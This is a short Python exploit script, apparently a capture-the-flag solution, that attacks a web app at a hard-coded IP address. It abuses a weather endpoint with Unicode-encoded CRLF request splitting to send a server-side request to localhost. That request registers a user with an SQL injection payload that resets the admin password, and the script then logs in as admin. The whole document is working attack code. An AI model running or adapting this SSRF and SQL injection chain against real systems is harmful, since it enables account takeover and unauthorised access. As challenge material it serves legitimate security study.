# https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/

import requests
from urllib.parse import urlencode

url = 'http://134.122.104.185:31801/'

reg_data = urlencode({
    'username': "admin",
    'password': "a') ON CONFLICT(username) DO UPDATE SET password='a'-- -"

})

raw_register_request = f'''127.0.0.1:8000 HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(reg_data)}

{reg_data}

GET /'''.replace(' ', '\u0120').replace('\n', '\u010D\u010A')

requests.post(url + 'api/weather', {
    'endpoint': raw_register_request,
    'city': 'a',
    'country': 'a'
})

r = requests.post(url + 'login', {
    'username': 'admin',
    'password': 'a'
})
print(r.text)